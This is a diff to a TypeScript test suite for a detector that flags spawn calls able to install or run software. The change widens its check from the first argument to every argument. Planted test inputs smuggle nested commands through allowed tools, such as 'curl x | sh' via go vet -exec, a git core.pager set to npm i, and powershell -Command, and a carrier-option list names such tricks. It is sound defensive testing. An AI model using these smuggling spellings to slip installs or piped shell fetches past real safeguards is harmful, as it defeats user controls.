@@ -27,18 +27,25 @@
  * is one of its admitted sites (the chokepoint's own children and fixed
  * `taskkill`/process-table literals), so the seam's callers ARE the population.
  *
+ * Review r2 found the next gap one level down: only argv[0] was judged, so
+ * `go vet -exec "curl x | sh"`, `git -c core.pager="npm i x" log` and
+ * `powershell.exe -NoProfile -Command "npm i x"` passed. Every argv element is
+ * now judged against the command's own inert-word set.
+ *
  * ## STATE TABLE (written before the detector)
  *
  * | form of a seam call                                    | read as            |
  * | ------------------------------------------------------ | ------------------ |
- * | command literal in KNOWN_GOOD, argv literal admitted   | clean (no hit)     |
- * | command literal not in KNOWN_GOOD (`npm`, `gem`, ...)  | HIT                |
- * | command in KNOWN_GOOD, argv first element not in its   | HIT                |
- * |   admitted set (`go get`, `go install`)                |                    |
+ * | command literal in KNOWN_GOOD, argv an array literal   | clean (no hit)     |
+ * |   whose EVERY element is a word in that command's set  |                    |
+ * | command literal not in KNOWN_GOOD (`npm`, `gem`, `sh`, | HIT                |
+ * |   `env`, `powershell.exe`, ...)                        |                    |
+ * | command in KNOWN_GOOD, any element (any position) a    | HIT                |
+ * |   word outside its set (`get`, `-exec`, `-c`, `-Command`)|                  |
  * | command computed (variable, call, member, `${}`        | HIT                |
  * |   template, `String.fromCharCode`, `process.env`)      |                    |
- * | argv not an array literal, or first element computed   | HIT (known-good    |
- * |   or spread                                            | command only)      |
+ * | argv absent or not an array literal, or any element    | HIT (known-good    |
+ * |   computed or spread                                   | command only)      |
  * | concatenated, parenthesised or escaped literal         | folded, then read  |
  * |                                                        | as a literal       |
  * | a seam name read any other way (alias, `const sp =`,   | HIT (reference)    |
@@ -112,22 +119,56 @@ const SEAM_MODULES: readonly string[] = [
 ];
 
 /**
- * Commands whose literal use cannot install anything, with the argv first
- * elements admitted (`"*"`: any). A command not named here is a hit, so the
- * list holds known-good forms only and a new spelling can never pass.
+ * Commands whose literal use cannot install anything, each with the argv
+ * WORDS it admits. A call is clean only when every argv element is a literal
+ * in its command's set; a command not named here, a word outside the set at
+ * any position, or a computed element is a hit, so the table holds known-good
+ * forms only and a new spelling can never pass.
+ *
+ * A word joins a set only when it is a fixed token that is neither an
+ * install, fetch or run verb nor an option taking a value (unless that value
+ * is itself a set word). A nested-command carrier (`-c`, `-C`, `-e`, `-x`,
+ * `-exec`, `--exec`, `-Command`, `/c`, `--config`, `--upload-pack`) is never
+ * one: its payload is a command. Each word is one a live site spells; a site
+ * with a computed operand is a classified row, never a wider set.
  */
-const KNOWN_GOOD: Readonly<Record<string, "*" | readonly string[]>> = {
-	brew: ["--prefix"],
-	cargo: ["--version", "clippy"],
+const KNOWN_GOOD: Readonly<Record<string, readonly string[]>> = {
+	brew: ["--prefix", "ast-grep"],
+	cargo: [
+		"--version",
+		"clippy",
+		"--fix",
+		"--allow-dirty",
+		"--allow-staged",
+		"-q",
+	],
 	cl: [],
-	dart: ["--version", "fix"],
-	dotnet: ["csharpier"],
-	gh: ["auth"],
-	git: "*",
-	go: ["env", "version", "vet"],
+	dart: ["--version", "fix", "--apply"],
+	dotnet: ["csharpier", "--version"],
+	gh: ["auth", "token"],
+	git: [
+		"--exclude-standard",
+		"--ignored",
+		"--is-inside-work-tree",
+		"--name-only",
+		"--no-renames",
+		"--others",
+		"--porcelain",
+		"--short",
+		"--show-toplevel",
+		"--untracked-files=all",
+		"--verify",
+		"-q",
+		"-z",
+		"HEAD",
+		"diff",
+		"ls-files",
+		"rev-parse",
+		"status",
+	],
+	go: ["env", "GOROOT", "version"],
 	govulncheck: ["-version"],
-	mix: ["credo"],
-	"powershell.exe": ["-NoProfile"],
+	mix: ["credo", "--version", "--format", "json", "--strict"],
 	vp: ["--version"],
 };
 
@@ -223,17 +264,17 @@ function whyNotKnownGood(
 	if (value === undefined)
 		return inheritComputed ? undefined : "a computed command";
 	if (!Object.hasOwn(KNOWN_GOOD, value)) return `command ${value}`;
-	const admitted = KNOWN_GOOD[value] as "*" | readonly string[];
-	if (admitted === "*") return undefined;
+	const admitted = KNOWN_GOOD[value] as readonly string[];
 	if (!argv || kindOf(argv) !== "array") return `${value} with a computed argv`;
-	const elements = kids(argv).filter(
-		(child) => child.isNamed() && kindOf(child) !== "comment",
-	);
-	const first = elements[0];
-	if (!first) return undefined;
-	const word = literalValue(first, kids);
-	if (word === undefined) return `${value} with a computed first argument`;
-	return admitted.includes(word) ? undefined : `${value} ${word}`;
+	// Every element, not the first: a carrier (`-exec`, `-c`, `-Command`) or a
+	// computed operand anywhere in argv can run or fetch something.
+	for (const element of kids(argv)) {
+		if (!element.isNamed() || kindOf(element) === "comment") continue;
+		const word = literalValue(element, kids);
+		if (word === undefined) return `${value} with a computed argument`;
+		if (!admitted.includes(word)) return `${value} with the argument ${word}`;
+	}
+	return undefined;
 }
 
 /**
@@ -664,6 +705,10 @@ const LSP =
 	"language-server launch and install code: its installs follow PI_LENS_DISABLE_LSP_INSTALL (canInstall in clients/lsp/server.ts, a separate switch), and its probes (java finder, --version) install nothing";
 const NPX_NO =
 	"npx --no: the package runner is told to use the local or cached copy and never download, and the seam runs it offline under the switch as well";
+const OPERAND =
+	"a known-good command and literal words plus one computed operand the census cannot fold: mix credo's file argument is path.resolve(cwd, file), an absolute path that cannot read as an option, and git diff's two operands are commit ids readGitHead read from git rev-parse; neither tool installs anything";
+const REGISTRY_PATH =
+	"a PowerShell -Command whose script is one fixed string literal reading the Machine and User Path variables (readWindowsRegistryPath); it starts no installer, and a changed script is a reviewed edit of this one line";
 
 const ROWS: Readonly<Record<string, Row>> = {
 	// ROWS-BEGIN
@@ -680,6 +725,13 @@ const ROWS: Readonly<Record<string, Row>> = {
 		"clients/lsp/jvm-runtime.ts#safeSpawnAsync": 1,
 		"clients/lsp/launch.ts#safeSpawn": 1,
 		"clients/lsp/server.ts#safeSpawnAsync": 4,
+	}),
+	...because(OPERAND, {
+		"clients/dispatch/runners/credo.ts#safeSpawnAsync": 1,
+		"clients/opaque-mutation-scan.ts#safeSpawnAsync": 1,
+	}),
+	...because(REGISTRY_PATH, {
+		"clients/lsp/launch.ts#runStderrGuardedProbe": 1,
 	}),
 	...because(NPX_NO, {
 		"clients/dispatch/runners/utils/runner-helpers.ts#probeAstGrepCommandAsync": 1,
@@ -762,7 +814,7 @@ const ROWS: Readonly<Record<string, Row>> = {
 		"clients/ruff-client.ts#safeSpawnAsync": 2,
 		"clients/security-scan-client.ts#probeToolAsync": 1,
 		"clients/sg-runner.ts#probeToolAsync": 1,
-		"clients/sg-runner.ts#safeSpawnAsync": 7,
+		"clients/sg-runner.ts#safeSpawnAsync": 4,
 		"clients/test-runner-client.ts#safeSpawn": 1,
 		"clients/test-runner-client.ts#safeSpawnAsync": 1,
 		"clients/trivy-client.ts#safeSpawnAsync": 1,
@@ -848,6 +900,23 @@ describe("install kill-switch census: planted bypasses (#5231)", () => {
 		["a spread argv", `"go", [...process.argv]`],
 		["a computed command", `process.env.TOOL as string, ["x"]`],
 		["a templated command", "`np${'x'}`, []"],
+		// Review r2: argv[0] alone was judged, so a nested command passed.
+		[
+			"powershell -Command",
+			`"powershell.exe", ["-NoProfile", "-Command", "npm i left-pad"]`,
+		],
+		["go vet -exec", `"go", ["vet", "-exec", "curl x | sh"]`],
+		["git -c core.pager", `"git", ["-c", "core.pager=npm i x", "log"]`],
+		// Unplanned spellings of the same gap (shape 69).
+		["a joined carrier", `"go", ["vet", "-exec=curl x | sh"]`],
+		[
+			"a carrier after an admitted first word",
+			`"go", ["env", "-w", "GOFLAGS=-toolexec=sh"]`,
+		],
+		[
+			"a computed operand after admitted words",
+			`"git", ["diff", "--name-only", process.env.REV as string]`,
+		],
 	])("%s is a finding", async (_label, args) => {
 		expect(await problemsOf(call(args))).toMatch(
 			/clients\/planted\.ts#safeSpawnAsync@1/,
@@ -855,9 +924,12 @@ describe("install kill-switch census: planted bypasses (#5231)", () => {
 	});
 
 	it("a known-good command with a known-good argv is clean", async () => {
-		expect(await problemsOf(call(`"gh", ["auth", "status"]`))).not.toMatch(
+		expect(await problemsOf(call(`"gh", ["auth", "token"]`))).not.toMatch(
 			/planted/,
 		);
+		expect(
+			await problemsOf(call(`"git", ["rev-parse", "--short", "HEAD"]`)),
+		).not.toMatch(/planted/);
 		expect(await problemsOf(call(`"go", ["version"]`))).not.toMatch(/planted/);
 		expect(await problemsOf(call(`"go", ["ver" + "sion"]`))).not.toMatch(
 			/planted/,
@@ -884,6 +956,12 @@ describe("install kill-switch census: planted bypasses (#5231)", () => {
 		expect(
 			await problemsOf(
 				`${HEAD}export function go() { const verb = "install"; const cmd = "pip"; return safeSpawnAsync(cmd, [verb, "x"]); }`,
+			),
+		).toMatch(/planted\.ts#safeSpawnAsync@1/);
+		// A carrier bound first, behind a known-good command and first word.
+		expect(
+			await problemsOf(
+				`${HEAD}export function go() { const flag = "-c"; return safeSpawnAsync("git", ["log", flag, "core.pager=sh"]); }`,
 			),
 		).toMatch(/planted\.ts#safeSpawnAsync@1/);
 	});
@@ -1117,29 +1195,70 @@ describe("install kill-switch census: generated spellings (#5231)", () => {
 			);
 		});
 
-	const word = fc.stringMatching(/^[a-z0-9-]{1,8}$/);
-	/** A known-good command with an argv its table admits. */
+	/** Words drawn from one command's inert set, in any order. */
+	const inertWords = (admitted: readonly string[]) =>
+		admitted.length === 0
+			? fc.constant([] as string[])
+			: fc.array(fc.constantFrom(...admitted), { maxLength: 4 });
+	/** A known-good command with an argv of its inert words only. */
 	const knownGood = fc
 		.constantFrom(...Object.entries(KNOWN_GOOD))
-		.chain(([command, admitted]) => {
-			const first =
-				admitted === "*"
-					? fc.array(word, { maxLength: 3 })
-					: admitted.length === 0
-						? fc.constant([] as string[])
-						: fc
-								.tuple(
-									fc.constantFrom(...admitted),
-									fc.array(word, { maxLength: 2 }),
-								)
-								.map(([head, rest]) => [head, ...rest]);
-			return fc.tuple(
+		.chain(([command, admitted]) =>
+			fc.tuple(
 				slotOf(command, FOLDING, false),
-				first.chain((words) =>
+				inertWords(admitted).chain((words) =>
 					fc.tuple(...words.map((w) => slotOf(w, FOLDING, false))),
 				),
-			);
-		});
+			),
+		);
+	/**
+	 * A known-good command whose argv holds ONE word outside its set, at any
+	 * position, among inert words: a nested-command carrier with its payload,
+	 * an installer verb, or an arbitrary option (review r2: `go vet -exec`,
+	 * `git -c core.pager=`, `powershell -Command`).
+	 */
+	const CARRIERS = [
+		"-c",
+		"-C",
+		"-e",
+		"-x",
+		"-exec",
+		"--exec",
+		"-Command",
+		"-EncodedCommand",
+		"/c",
+		"--config",
+		"--upload-pack",
+		"core.pager=npm i x",
+		"-exec=curl x | sh",
+		"install",
+		"get",
+	];
+	const outsider = (admitted: readonly string[]) =>
+		fc
+			.oneof(
+				fc.constantFrom(...CARRIERS),
+				fc.stringMatching(/^-{0,2}[a-zA-Z][a-zA-Z0-9.=-]{0,10}$/),
+			)
+			.filter((value) => !admitted.includes(value));
+	const smuggled = fc
+		.constantFrom(...Object.entries(KNOWN_GOOD))
+		.chain(([command, admitted]) =>
+			fc.tuple(
+				slotOf(command, FOLDING, false),
+				fc
+					.tuple(inertWords(admitted), outsider(admitted), fc.nat(8))
+					.map(([words, extra, at]) => {
+						const cut = words.length === 0 ? 0 : at % (words.length + 1);
+						return [...words.slice(0, cut), extra, ...words.slice(cut)];
+					})
+					.chain((words) =>
+						fc.tuple(
+							...words.map((w) => slotOf(w, [...FOLDING, ...COMPUTED], true)),
+						),
+					),
+			),
+		);
 
 	const verdictOf = async (command: Slot, argv: Slot[]): Promise<string> =>
 		(
@@ -1153,6 +1272,17 @@ describe("install kill-switch census: generated spellings (#5231)", () => {
 	it("A: every generated installer spawn is a finding", async () => {
 		await fc.assert(
 			fc.asyncProperty(installer, async ([command, argv]) => {
+				expect(await verdictOf(command, argv)).toMatch(
+					/clients\/planted\.ts#safeSpawnAsync@1/,
+				);
+			}),
+			{ numRuns: RUNS },
+		);
+	});
+
+	it("A2: a known-good command with any argument outside its set, at any position, is a finding", async () => {
+		await fc.assert(
+			fc.asyncProperty(smuggled, async ([command, argv]) => {
 				expect(await verdictOf(command, argv)).toMatch(
 					/clients\/planted\.ts#safeSpawnAsync@1/,
 				);
